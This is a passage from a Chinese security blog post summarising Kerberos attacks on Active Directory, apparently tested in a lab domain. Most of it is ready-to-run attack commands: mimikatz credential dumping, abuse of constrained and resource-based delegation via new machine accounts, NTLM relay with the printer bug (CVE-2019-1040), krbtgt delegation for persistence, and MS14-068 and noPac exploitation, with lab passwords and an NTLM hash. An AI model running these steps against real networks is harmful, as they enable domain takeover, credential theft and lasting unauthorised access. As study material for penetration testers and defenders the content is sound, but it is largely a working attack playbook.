<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 申请服务票据</span><br>kekeo.exe <span class="hljs-string">&quot;tgs::s4u /tgt:[0;3e7]-2-1-40e10000-WIN10-1<span class="hljs-variable">$@krbtgt</span>-REDTEAM.LAB.kirbi /user:Administrator@redteam.lab /service:cifs/DC2016.redteam.lab&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DzgJwnlApq.png" srcset="/img/loading.gif" lazyload alt=""></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导入票据</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt TGS_Administrator@redteam.lab@REDTEAM.LAB_cifs~DC2016.redteam.lab@REDTEAM.LAB.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment"># 访问</span><br><span class="hljs-built_in">dir</span> \\DC2016.redteam.lab\c$<br></code></pre></td></tr></table></figure>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ptgvPyz844.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h4 id="使用机器账户的Hash值"><a href="#使用机器账户的Hash值" class="headerlink" title="使用机器账户的Hash值"></a>使用机器账户的Hash值</h4><p><strong>利用条件：</strong></p>
<ol>
<li>需要Administrator权限</li>
<li>目标机器账户配置了约束性委派</li>
</ol>
<p><strong>利用过程：</strong></p>
<ol>
<li>使用mimikatz获取NTLM Hash值</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_M3fFHJ-7LV.png" srcset="/img/loading.gif" lazyload alt=""></p>
<ol>
<li>使用getST申请服务票据</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py -dc-ip 10.10.2.20 -spn CIFS/DC2016.redteam.lab -impersonate administrator redteam.lab/WIN10-1$ -hashes :8f91f8786d308e62c609688886dc7c4c<br></code></pre></td></tr></table></figure>
<ol>
<li>使用票据远程访问</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">KRB5CCNAME=administrator.ccache python3 wmiexec.py -k redteam.lab/administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure>
<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_y47Ef1YU8I.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h3 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>Resource Based Constrained Delegation（RBCD）不需要通过具备SeEnableDelegationPrivilege权限的域管理员进行修改，<strong>而是将设置属性的权限给了服务资源本身</strong>。</p>
<p>配置了RBCD的账户属性有如下变化：</p>
<ul>
<li><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性指向委派账户</li>
</ul>
<p>可以将基于资源的约束性委派理解为传统的约束性委派的反向过程。</p>
<p>以A、B两个服务为例，约束性委派需要在A上设置<code>msDS-AllowedToDelegateTo</code>属性，以指定对B上的哪个服务进行委派。而RBCD需要在B上将<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性值设为A的SID，允许A对B上的服务进行委派</p>
<p>此外，在传统的约束性委派中，通过S4U2Self申请到的ST票据一定是可转发的，否则S4U2Proxy阶段将失败。但在RBCD中，不可转发的ST仍然可以通过S4U2Proxy阶段对其他服务进行委派认证。</p>
<h4 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h4><ol>
<li>具有对主机修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权利</li>
<li>可以创建机器账户（或已经知道机器账户）</li>
</ol>
<p><strong>具备修改msDS-AllowedToActOnBehalfOfOtherIdentity属性权限的用户：</strong></p>
<ol>
<li>将该主机加入域的用户账户<br>该账户中有一个<code>msDS-CreatorSID</code>属性，用于标记加入域时使用的用户账户SID</li>
<li>Account Operator组成员</li>
<li>该主机的机器账户</li>
</ol>
<p><strong>具备创建及其账户权限的用户：</strong></p>
<ol>
<li>一般域成员，由<code>msDS-MachineAccountQuota</code>属性决定，默认可以创建10个机器账户</li>
</ol>
<h4 id="侦查思路：找到可修改委派权限的用户"><a href="#侦查思路：找到可修改委派权限的用户" class="headerlink" title="侦查思路：找到可修改委派权限的用户"></a>侦查思路：找到可修改委派权限的用户</h4><ol>
<li>已知机器账户</li>
<li>找到使其加入域中的用户账户，这个用户账户就具备修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用adfind.exe查找机器账户的mS-DS-CreatorSID属性</span><br>AdFind.exe -h 10.10.2.20 -u ken -up 123.com -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;objectClass=computer&quot;</span> mS-DS-CreatorSID<br><br><span class="hljs-comment"># 使用Powershell反查SID对应的用户</span><br>powerpick <span class="hljs-variable">$objSID</span> = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-3309395417-4108617856-2168433834-1104;<span class="hljs-variable">$objUser</span> = <span class="hljs-variable">$objSID</span>.Translate([System.Security.Principal.NTAccount]);<span class="hljs-variable">$objUser</span>.Value<br></code></pre></td></tr></table></figure>
<h4 id="侦查思路：由用户查找其加入域中的机器"><a href="#侦查思路：由用户查找其加入域中的机器" class="headerlink" title="侦查思路：由用户查找其加入域中的机器"></a>侦查思路：由用户查找其加入域中的机器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查用户账户SID</span><br><span class="hljs-built_in">whoami</span> /all<br><br><span class="hljs-comment"># 使用PowerView查经由该用户加入域内的机器账户(主机)</span><br><span class="hljs-comment"># 需要具备GeneriCall或WriteProperty等修改权限</span><br>powershell-import PowerView.ps1<br>powerpick Get-DomainObjectAcl | ?&#123;<span class="hljs-variable">$_</span>.SecurityIdentifier -match <span class="hljs-string">&quot;S-1-5-21-3309395417-4108617856-2168433834-1104&quot;</span>&#125; | select objectdn,activedirectoryrights<br></code></pre></td></tr></table></figure>
<h4 id="通过管理主机加入域的用户拿下主机"><a href="#通过管理主机加入域的用户拿下主机" class="headerlink" title="通过管理主机加入域的用户拿下主机"></a>通过管理主机加入域的用户拿下主机</h4><p><strong>关键：</strong> 能修改那台服务资源的委派属性，就能拿下该台主机</p>
<p><strong>利用条件：</strong></p>
<ol>
<li>允许创建机器账户</li>
<li>具有管理主机加入域的用户账户</li>
</ol>
<p><strong>利用过程：</strong></p>
<ol>
<li>添加机器账户</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用addcpmputer创建机器账户</span><br>python3 addcomputer.py redteam.lab/ken:123.com -method LDAPS -computer-name CPT01\$ -computer-pass Passw0rd -dc-ip 10.10.2.20<br><br><span class="hljs-comment"># 使用bloodyAD工具创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT01 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br><br></code></pre></td></tr></table></figure>
<ol>
<li>查询机器账户的SID</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 PowerView 工具查询机器账户SID</span><br>S-1-5-21-3309395417-4108617856-2168433834-1108<br><br></code></pre></td></tr></table></figure>
<ol>
<li>修改服务资源的委派属性，即 msDS-AllowedToActOnBehalfOfOtherIdentity</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导入powershell Set-ExecutionPolicy Bypass -Scope Process. .\powerview.ps1</span><br>powershell-import PowerView.ps1<br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1108)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><span class="hljs-comment"># 查询属性</span><br>powerpick Get-DomainComputer SERVER2012 -Properties msds-allowedtoactonbehalfofotheridentity<br><span class="hljs-comment"># 域控查询命令</span><br>Get-ADComputer SERVER2012 -Properties PrincipalsAllowedToDelegateToAccount<br><span class="hljs-comment"># 清除属性</span><br>Set-DomainObject SERVER2012 -Clear <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> -Verbose<br><br></code></pre></td></tr></table></figure>
<ol>
<li>申请服务票据并利用</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用getST.py申请票据</span><br>python3 getST.py redteam.lab/CPT01$:Passw0rd -spn cifs/SERVER2012.redteam.lab -impersonate administrator -dc-ip 10.10.2.20<br><span class="hljs-comment"># 导入票据</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=/root/Desktop/administrator.ccache<br><span class="hljs-comment"># 直接登录</span><br>python3 wmiexec.py -k redteam.lab/administrator@SERVER2012.redteam.lab -no-pass<br>python3 psexec.py -k redteam.lab/administrator@SERVER2012.redteam.lab -no-pass<br></code></pre></td></tr></table></figure>
<h4 id="已知Account-Operators组用户拿下主机"><a href="#已知Account-Operators组用户拿下主机" class="headerlink" title="已知Account Operators组用户拿下主机"></a>已知Account Operators组用户拿下主机</h4><p>可以获得域内除了域控之外的所有机器</p>
<p><strong>利用条件：</strong></p>
<ol>
<li>获得属于Account Operators组的用户账户</li>
<li>可以创建机器账户</li>
</ol>
<p>Acount Operators组成员能修改<strong>域内任意主机</strong><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p>
<p><strong>利用过程：</strong></p>
<ol>
<li>查询Account Operators组成员</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adfind.exe -h 10.10.2.20:389 -s subtree -b CN=<span class="hljs-string">&quot;Account Operators&quot;</span>,CN=Builtin,DC=redteam,DC=lab member<br></code></pre></td></tr></table></figure>
<ol>
<li>创建机器账户</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用bloodyAD.py创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u mark -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT02 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure>
<ol>
<li>设置委派属性</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用PowerView工具查询机器账户SID</span><br>powerpick Get-NetComputer CPT02 -Properties objectsid<br>S-1-5-21-3309395417-4108617856-2168433834-1112<br><br><span class="hljs-comment"># 修改服务资源msDS-AllowedToActOnBehalfOfOtherIdentity属性</span><br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1112)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><br><span class="hljs-comment"># 查询属性</span><br>powerpick Get-DomainComputer WIN7-1 -Properties msds-allowedtoactonbehalfofotheridentity<br><br></code></pre></td></tr></table></figure>
<ol>
<li>申请服务票据并利用</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建服务票据</span><br>python3 getST.py redteam.lab/CPT02$:Passw0rd -spn cifs/WIN7-1.redteam.lab -impersonate administrator -dc-ip 10.10.2.20<br><br><span class="hljs-comment"># 导入票据</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=/root/Desktop/administrator.ccache<br><br><span class="hljs-comment"># 直接登录</span><br>python3 wmiexec.py -k redteam.lab/administrator@WIN7-1.redteam.lab -no-pass<br>python3 psexec.py -k redteam.lab/administrator@WIN7-1.redteam.lab -no-pass<br></code></pre></td></tr></table></figure>
<h4 id="结合HTML-Relay攻击拿下主机（CVE-2019-1040）"><a href="#结合HTML-Relay攻击拿下主机（CVE-2019-1040）" class="headerlink" title="结合HTML Relay攻击拿下主机（CVE-2019-1040）"></a>结合HTML Relay攻击拿下主机（CVE-2019-1040）</h4><p>绕过NTLM MIC校验+打印机漏洞+NTLM Relay+基于资源的约束性委派组合攻击</p>
<p><strong>利用条件：</strong></p>
<ol>
<li>目标开启打印机服务</li>
<li>能创建机器账户</li>
</ol>
<p><strong>利用过程：</strong></p>
<ol>
<li>创建机器账户</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT03 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure>
<ol>
<li>监听认证请求</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ntlmrelayx.py -t ldap://10.10.2.20 -smb2support --remove-mic --delegate-access --escalate-user CPT03\$<br></code></pre></td></tr></table></figure>
<ol>
<li>打印机漏洞执行强制认证</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 printerbug.py redteam.lab/ken:123.com@10.10.2.50 10.10.2.77<br></code></pre></td></tr></table></figure>
<ol>
<li>申请服务票据</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py redteam.lab/CPT03\$:Passw0rd -spn CIFS/SERVER2012.redteam.lab -impersonate Administrator -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure>
<ol>
<li>使用服务票据</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注入票据</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=Administrator.ccache<br><br><span class="hljs-comment"># 远程访问</span><br>python3 smbexec.py -target-ip 10.10.2.50 -k SERVER2012.redteam.lab -no-pass<br></code></pre></td></tr></table></figure>
<h4 id="krbtgt用户委派"><a href="#krbtgt用户委派" class="headerlink" title="krbtgt用户委派"></a>krbtgt用户委派</h4><p>在获取到域控权限后，可以对krbtgt用户设置委派属性，以实现维持权限的目的</p>
<p><strong>利用条件：</strong></p>
<ol>
<li>获取域控权限</li>
</ol>
<p><strong>利用过程：</strong></p>
<ol>
<li>设置委派属性</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT04 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br><br><span class="hljs-comment"># 设置krbtgt委派权限 | 查询</span><br>Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount CPT04$<br>Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount<br></code></pre></td></tr></table></figure>
<ol>
<li>申请&amp;使用票据</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py redteam.lab/CPT04\$:Passw0rd -spn krbtgt -impersonate Administrator -dc-ip 10.10.2.20<br><span class="hljs-built_in">export</span> KRB5CCNAME=Administrator.ccache<br><br>python3 smbexec.py -k administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br>KRB5CCNAME=Administrator.ccache | python3 smbexec.py -k administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure>
<h2 id="PAC攻击"><a href="#PAC攻击" class="headerlink" title="PAC攻击"></a>PAC攻击</h2><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>MS14-068漏洞的原因是KDC无法正确检查PAC中的有效签名，由于其实现签名的加密允许所有的签名算法，只要客户端指定任意签名算法，KDC服务就会使用指定的算法进行签名验证，因此可以利用不需要相关密钥的算法，如MD5，实现内容的任意更改，导致用户可以自己构造一张PAC，伪造用户的SID和所在的组。</p>
<p>那么通过伪造的PAC，加入域管相关信息，访问域控服务，KDC会认为当前用户有权限，从而把这个用户当作域管组的成员，进而达到提升至域管理员的效果</p>
<ol>
<li>在WIN2008上利用kekeo执行如下命令，便可以成功访问域控CIFS服务</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kekeo.exe <span class="hljs-string">&quot;exploit::ms14068 /domain:aurey.com /user:username /password:password /ptt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
<p>除此之外，也可以利用impacket中的goldenPac，直接返回一个交互式Shell</p>
<h3 id="CVE-2021-42278-amp-CVE-2021-42287（NoPac）"><a href="#CVE-2021-42278-amp-CVE-2021-42287（NoPac）" class="headerlink" title="CVE-2021-42278 &amp; CVE-2021-42287（NoPac）"></a>CVE-2021-42278 &amp; CVE-2021-42287（NoPac）</h3><p>CVE-2021-42278：机器账户的名字一般以<code>$</code>结尾，但AD没有对域内机器账户名做验证。导致机器用户名可以被冒用</p>
<p>CVE-2021-42287：假设域控名为DC（对应的机器账户为DC$），攻击者利用CVE-2021-42278创建一个机器账户TEST$，再把机器账户TEST$的sAMAccountName改成DC。此时用户DC申请一个TGT票据。再把DC的sAMAccountName改回TEST$。这时候KDC会判断域内没有DC这个账户，自动取搜索DC$（DC$是域控DC的sAMAccountName），攻击者利用刚刚申请的TGT进行S4U2Self，模拟域控去请求ST票据， 最终获得域控DC的权限。</p>
<p>工具：sam-the-admin：<a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin" title="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python3 sam_the_admin.py <span class="hljs-string">&quot;king/windows03w:edcRFV222&quot;</span> <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">204.146</span> <span class="hljs-literal">-shell</span><br></code></pre></td></tr></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">#域渗透</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Kerberos Summary</div>
      <div>http://aurey7.github.io.git/2023/07/26/Kerberos-Summary/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Aurey7</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年7月26日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/07/23/Authority-HackTheBox/" title="Authority - HackTheBox">
                        <span class="hidden-mobile">Authority - HackTheBox</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"p05Dpl9y8j46kYbkrPmdQHe5-gzGzoHsz","appKey":"AG8e6lFbZr5DSdTu49Bs70X0","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
